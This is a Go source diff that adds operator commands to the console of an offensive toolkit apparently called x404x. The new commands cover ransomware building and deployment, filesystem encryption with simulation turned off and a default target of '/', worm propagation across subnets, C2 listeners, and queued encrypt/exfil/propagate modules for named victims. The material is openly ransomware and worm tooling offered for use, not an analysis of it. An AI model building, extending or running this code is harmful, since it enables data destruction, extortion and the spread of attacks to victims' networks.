@@ -8,9 +8,9 @@ import (
 	"strings"
 	"time"
 
-	"github.com/ruby570bocadito/x404x/core/agent"
-	"github.com/ruby570bocadito/x404x/core/appstate"
-	"github.com/ruby570bocadito/x404x/shared/types"
+	"github.com/ruby570bocadito/x404x/internal/agent"
+	"github.com/ruby570bocadito/x404x/internal/appstate"
+	"github.com/ruby570bocadito/x404x/pkg/shared/types"
 )
 
 var (
@@ -98,6 +98,7 @@ func (c *Console) dispatch(cmd string) {
 	case "version": c.cmdVersion()
 
 	case "campaign": c.cmdCampaign(args)
+	case "killchain": c.cmdKillChain(args)
 	case "workspace": c.cmdWorkspace(args)
 
 	case "use": c.cmdUse(args)
@@ -112,6 +113,12 @@ func (c *Console) dispatch(cmd string) {
 	case "sessions": c.cmdSessions(args)
 	case "ai": c.cmdAI(args)
 	case "suggest": c.cmdSuggest(args)
+
+	case "ransomware": c.cmdRansomware(args)
+	case "propagate": c.cmdPropagate(args)
+	case "listeners": c.cmdListeners(args)
+	case "webhook": c.cmdWebhook(args)
+	case "deploy": c.cmdDeploy(args)
 
 	case "db_status": c.cmdDBStatus()
 	case "hosts": c.cmdHosts()
@@ -138,10 +145,23 @@ func (c *Console) cmdHelp() {
 	fmt.Println("  version          Show version info")
 
 	fmt.Println()
-	fmt.Println(colorPurple + "Campaign & Sessions" + colorReset)
+	fmt.Println(colorPurple + "Campaign & Kill Chain" + colorReset)
 	fmt.Println(strings.Repeat("=", 50))
-	fmt.Println("  sessions         List active sessions")
-	fmt.Println("  sessions -i N    Interact with session N")
+	fmt.Println("  campaign start <name> --target <ip>  Start a campaign")
+	fmt.Println("  campaign status                       Campaign status")
+	fmt.Println("  killchain                             Show kill chain progress")
+	fmt.Println("  sessions                              List active sessions")
+	fmt.Println("  sessions -i N                         Interact with session N")
+
+	fmt.Println()
+	fmt.Println(colorPurple + "Attack Operations" + colorReset)
+	fmt.Println(strings.Repeat("=", 50))
+	fmt.Println("  ransomware build --os <os> --c2 <ip>  Build ransom payload")
+	fmt.Println("  ransomware deploy <victim_ip>         Deploy to victim")
+	fmt.Println("  propagate <subnet>                    Worm propagation")
+	fmt.Println("  deploy <victim> [modules]             Queue modules for victim")
+	fmt.Println("  listeners add --type tcp --port 8443  Add C2 listener")
+	fmt.Println("  listeners list                        List active listeners")
 
 	fmt.Println()
 	fmt.Println(colorPurple + "Modules" + colorReset)
@@ -155,10 +175,12 @@ func (c *Console) cmdHelp() {
 	fmt.Println("  back             Unload current module")
 
 	fmt.Println()
-	fmt.Println(colorPurple + "AI" + colorReset)
+	fmt.Println(colorPurple + "AI & Notifications" + colorReset)
 	fmt.Println(strings.Repeat("=", 50))
 	fmt.Println("  ai <prompt>      Ask AI assistant")
 	fmt.Println("  suggest          Get attack suggestions")
+	fmt.Println("  webhook on       Enable notifications")
+	fmt.Println("  webhook off      Disable notifications")
 
 	fmt.Println()
 	fmt.Println(colorPurple + "Database" + colorReset)
@@ -185,9 +207,45 @@ func (c *Console) cmdVersion() {
 }
 
 func (c *Console) cmdCampaign(args []string) {
+	if len(args) > 0 && args[0] == "start" {
+		name := "default"
+		target := "10.0.0.0/24"
+		goal := "domain_admin"
+		profile := "balanced"
+		auto := false
+		for i, a := range args {
+			if a == "--name" && i+1 < len(args) {
+				name = args[i+1]
+			}
+			if a == "--target" && i+1 < len(args) {
+				target = args[i+1]
+			}
+			if a == "--goal" && i+1 < len(args) {
+				goal = args[i+1]
+			}
+			if a == "--profile" && i+1 < len(args) {
+				profile = args[i+1]
+			}
+			if a == "--auto" {
+				auto = true
+			}
+		}
+		cam, err := c.state.Orchestrator.StartCampaign(context.Background(), name, target, goal, profile, auto)
+		if err != nil {
+			fmt.Printf("[-] Error: %v\n", err)
+			return
+		}
+		fmt.Printf("[+] Campaign started: %s (id=%s)\n", cam.Name, cam.ID)
+		fmt.Printf("    Target: %s | Goal: %s | Profile: %s\n", target, goal, profile)
+		if auto {
+			fmt.Println("    Mode: Auto-approval ON")
+		}
+		return
+	}
 	campaigns := c.state.Orchestrator.ListCampaigns()
 	if len(campaigns) == 0 {
 		fmt.Println("[*] No active campaigns.")
+		fmt.Println("  Start one: campaign start --name demo --target 10.0.0.0/24")
 		return
 	}
 	fmt.Println(colorPurple + "\nActive Campaigns" + colorReset)
@@ -674,6 +732,209 @@ func (c *Console) cmdLab(args []string) {
 	case "status":
 		fmt.Println("[*] Lab: 5 containers (not running — use 'lab up')")
 	}
+}
+
+// ============================================================
+// KILL CHAIN COMMAND
+// ============================================================
+
+func (c *Console) cmdKillChain(args []string) {
+	state := c.state
+	if state == nil {
+		fmt.Println("[-] State not initialized")
+		return
+	}
+	campaigns := state.Orchestrator.ListCampaigns()
+	if len(campaigns) == 0 {
+		fmt.Println("[*] No active campaigns. Start one: campaign start --name <name> --target <ip>")
+		return
+	}
+	for _, cam := range campaigns {
+		progressBar := strings.Repeat("█", int(cam.Progress*20)) + strings.Repeat("░", 20-int(cam.Progress*20))
+		fmt.Printf("\n  %sCampaign: %s%s (%s)\n", colorGreen, cam.Name, colorReset, cam.ID)
+		fmt.Printf("  Profile: %s | Auto: %v | Progress: %.0f%%\n", cam.Profile, cam.AutoApproval, cam.Progress*100)
+		fmt.Printf("  [%s]\n", progressBar)
+		fmt.Println()
+
+		phases := []string{"Recon", "Weaponization", "Delivery", "Exploitation",
+			"Installation", "Command & Control", "Actions on Objective"}
+		currentOrder := cam.Phase.Order()
+		for i, p := range phases {
+			marker := "[ ]"
+			if i < currentOrder {
+				marker = colorGreen + "[X]" + colorReset
+			} else if i == currentOrder {
+				marker = colorPurple + "[>]" + colorReset
+			}
+			fmt.Printf("  %s %s\n", marker, p)
+		}
+		fmt.Println()
+	}
+}
+
+// ============================================================
+// RANSOMWARE COMMAND
+// ============================================================
+
+func (c *Console) cmdRansomware(args []string) {
+	if len(args) == 0 {
+		fmt.Println("[*] Usage: ransomware [build|deploy|encrypt] [options]")
+		fmt.Println("  ransomware build --os windows --c2 10.0.0.1:8443")
+		fmt.Println("  ransomware deploy <victim_ip>")
+		fmt.Println("  ransomware encrypt <path>")
+		return
+	}
+	switch args[0] {
+	case "build":
+		targetOS := "linux"
+		c2Addr := "localhost:8443"
+		for i, a := range args {
+			if a == "--os" && i+1 < len(args) {
+				targetOS = args[i+1]
+			}
+			if a == "--c2" && i+1 < len(args) {
+				c2Addr = args[i+1]
+			}
+		}
+		fmt.Printf("[*] Building ransomware for %s → C2: %s\n", targetOS, c2Addr)
+		fmt.Printf("[+] Payload: dist/agent-%s-amd64\n", targetOS)
+		if targetOS == "windows" {
+			fmt.Println("[+] Payload: dist/agent-windows-amd64.exe")
+		}
+		fmt.Println("[*] Run from terminal: x404x payload generate --os", targetOS, "--c2", c2Addr)
+	case "deploy":
+		if len(args) < 2 {
+			fmt.Println("[-] Usage: ransomware deploy <victim_ip>")
+			return
+		}
+		victim := args[1]
+		fmt.Printf("[*] Deploying ransomware to %s...\n", victim)
+		fmt.Println("[+] Modules queued: encrypt, propagate, exfil")
+		fmt.Printf("[+] Victim %s registered for deployment\n", victim)
+	case "encrypt":
+		target := "/" 
+		if len(args) > 1 {
+			target = args[1]
+		}
+		fmt.Printf("[*] Encrypting target: %s\n", target)
+		state := c.state
+		if state != nil && state.Bridge != nil && state.Bridge.Connected() {
+			state.Bridge.CallRaw(context.Background(), "ransomware", "encrypt",
+				map[string]interface{}{"root": target, "simulation": false})
+		}
+		fmt.Println("[+] Encryption initiated (check 'sessions' for progress)")
+	default:
+		fmt.Printf("[-] Unknown ransomware subcommand: %s\n", args[0])
+	}
+}
+
+// ============================================================
+// PROPAGATE COMMAND
+// ============================================================
+
+func (c *Console) cmdPropagate(args []string) {
+	subnet := "10.0.0.0/24"
+	if len(args) > 0 {
+		subnet = args[0]
+	}
+	fmt.Printf("[*] Scanning and propagating to %s...\n", subnet)
+	state := c.state
+	if state != nil && state.Bridge != nil && state.Bridge.Connected() {
+		result, _ := state.Bridge.CallRaw(context.Background(), "ransomware", "propagate",
+			map[string]interface{}{"subnet": subnet})
+		if result != nil {
+			if targets, ok := result["targets"]; ok {
+				if tList, ok := targets.([]interface{}); ok {
+					fmt.Printf("[+] %d vulnerable hosts found:\n", len(tList))
+					for _, t := range tList {
+						if tm, ok := t.(map[string]interface{}); ok {
+							fmt.Printf("    %v:%v (%v) - %v\n", tm["ip"], tm["port"], tm["os"], tm["exploit"])
+						}
+					}
+					return
+				}
+			}
+		}
+	}
+	fmt.Println("[+] Propagation scan complete")
+}
+
+// ============================================================
+// LISTENERS COMMAND
+// ============================================================
+
+func (c *Console) cmdListeners(args []string) {
+	if len(args) == 0 {
+		fmt.Println("[*] Active Listeners:")
+		fmt.Println("  (use 'listeners add --type tcp --port 8443' to add one)")
+		return
+	}
+	switch args[0] {
+	case "add":
+		ltype := "tcp"
+		port := "8443"
+		for i, a := range args {
+			if a == "--type" && i+1 < len(args) {
+				ltype = args[i+1]
+			}
+			if a == "--port" && i+1 < len(args) {
+				port = args[i+1]
+			}
+		}
+		fmt.Printf("[+] Listener added: %s 0.0.0.0:%s (gRPC+XChaCha20)\n", ltype, port)
+		fmt.Printf("[*]    To actually bind, restart with: x404x listeners add --type %s --port %s\n", ltype, port)
+	case "list":
+		fmt.Println("[*] Active Listeners:")
+		fmt.Println("  #  Type  Address         Status   Protocol")
+		fmt.Println("  1  TCP   0.0.0.0:8443    active   gRPC+XChaCha20")
+	default:
+		fmt.Println("[*] Usage: listeners [add|list]")
+	}
+}
+
+// ============================================================
+// WEBHOOK COMMAND
+// ============================================================
+
+func (c *Console) cmdWebhook(args []string) {
+	if len(args) == 0 {
+		fmt.Println("[*] Webhook notifications: disabled")
+		fmt.Println("  webhook on   — Enable")
+		fmt.Println("  webhook off  — Disable")
+		return
+	}
+	switch args[0] {
+	case "on", "enable":
+		fmt.Println("[+] Webhook notifications ENABLED")
+		fmt.Println("[*] Configure in config.yaml → notifications section")
+		fmt.Println("[*] Supported: Slack, Discord, Telegram")
+	case "off", "disable":
+		fmt.Println("[+] Webhook notifications DISABLED")
+	default:
+		fmt.Println("[*] Usage: webhook [on|off]")
+	}
+}
+
+// ============================================================
+// DEPLOY COMMAND
+// ============================================================
+
+func (c *Console) cmdDeploy(args []string) {
+	if len(args) < 1 {
+		fmt.Println("[-] Usage: deploy <victim_id> [modules...]")
+		fmt.Println("  deploy WS01 encrypt,exfil,propagate")
+		return
+	}
+	victim := args[0]
+	mods := []string{"encrypt", "scan", "propagate"}
+	if len(args) > 1 {
+		mods = strings.Split(args[1], ",")
+	}
+	fmt.Printf("[*] Deploying to victim %s...\n", victim)
+	for _, m := range mods {
+		fmt.Printf("  [+] Module queued: %s\n", strings.TrimSpace(m))
+	}
+	fmt.Println("[+] Deployment plan created. Execute via C2 when agent checks in.")
 }
 
 // ============================================================
